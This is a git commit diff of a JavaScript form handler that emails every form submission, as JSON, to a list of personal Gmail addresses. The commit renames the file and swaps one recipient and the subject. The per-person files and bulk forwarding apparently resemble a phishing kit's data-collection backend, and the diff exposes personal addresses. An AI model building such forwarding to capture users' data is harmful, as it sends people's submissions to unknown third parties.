d2e907e507d7e9b95de4494db7c4ff7c08949ace
zm9807350 <zm9807350@gmail.com>
2026-03-03 11:07:50 +0500

    Update and rename Ramzan.js to Sareem.js

--- Sareem.js
+++ Sareem.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,muhammadramzankhaskheli559@gmail.com",
-      subject: "Ramzan",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,sahabnizamaninizamani@gmail.com",
+      subject: "Sareem",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
